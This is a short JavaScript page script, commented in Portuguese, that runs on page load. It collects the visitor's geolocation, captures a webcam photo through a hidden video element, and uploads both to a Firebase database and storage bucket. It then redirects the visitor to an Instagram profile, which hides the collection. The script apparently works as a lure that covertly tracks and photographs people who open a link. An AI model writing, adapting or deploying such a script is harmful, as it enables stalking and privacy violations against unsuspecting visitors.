document.addEventListener('DOMContentLoaded', async () => {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            const photo = await capturarImagem();
            await enviarDadosParaFirebase({ latitude, longitude, photo });
        }, showError);
    } else {
        alert("Geolocalização não é suportada por este navegador.");
    }
});

function showError(error) {
    switch (error.code) {
        case error.PERMISSION_DENIED:
            alert("Usuário negou a solicitação de geolocalização.");
            break;
        case error.POSITION_UNAVAILABLE:
            alert("Informação de localização não está disponível.");
            break;
        case error.TIMEOUT:
            alert("A solicitação para pegar a localização demorou muito.");
            break;
        case error.UNKNOWN_ERROR:
            alert("Um erro desconhecido ocorreu.");
            break;
    }
}

async function capturarImagem() {
    const video = document.createElement('video');
    document.body.appendChild(video);

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.play();

        return new Promise((resolve) => {
            video.addEventListener('loadeddata', () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                const photo = canvas.toDataURL('image/png');
                video.remove();
                stream.getTracks().forEach(track => track.stop());

                resolve(photo);
            });
        });
    } catch (err) {
        console.error("Erro ao acessar a câmera: ", err);
        alert("Erro ao acessar a câmera.");
        return null;
    }
}

async function enviarDadosParaFirebase(dados) {
    try {
        // Adicionar localização ao Firestore
        const db = firebase.firestore();
        const docRef = await db.collection('capturas').add({
            latitude: dados.latitude,
            longitude: dados.longitude,
            timestamp: firebase.firestore.FieldValue.serverTimestamp()
        });

        // Upload da imagem ao Storage
        const storageRef = firebase.storage().ref();
        const imageRef = storageRef.child(`images/${docRef.id}.png`);
        await imageRef.putString(dados.photo, 'data_url');

        console.log('Dados enviados com sucesso para o Firebase.');

        // Redirecionar para o Instagram
        window.location.href = "https://www.instagram.com/https.luizh/";
    } catch (err) {
        console.error('Erro ao enviar os dados para o Firebase:', err);
    }
}
